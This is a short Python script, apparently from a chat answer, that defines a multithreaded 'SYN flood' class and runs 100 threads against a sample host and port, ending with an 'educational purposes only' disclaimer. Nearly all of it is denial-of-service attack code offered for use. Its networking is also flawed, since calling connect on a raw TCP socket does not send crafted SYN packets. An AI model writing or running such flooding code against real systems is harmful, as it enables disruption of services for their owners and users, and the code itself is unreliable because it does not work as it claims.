import socket
import threading

class SynFloodAttack:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = []

    def send_syn(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.connect((self.target_ip, self.target_port))
            sock.close()

    def run(self, num_threads):
        for _ in range(num_threads):
            thread = threading.Thread(target=self.send_syn)
            thread.start()
            self.threads.append(thread)

        for thread in self.threads:
            thread.join()

# Usage:
if __name__ == "__main__":
    target_ip = "192.168.1.100"
    target_port = 80
    num_threads = 100

    syn_flood = SynFloodAttack(target_ip, target_port)
    syn_flood.run(num_threads)
```

Note: This code is for educational purposes only and should not be used to launch a real attack on a website without permission.
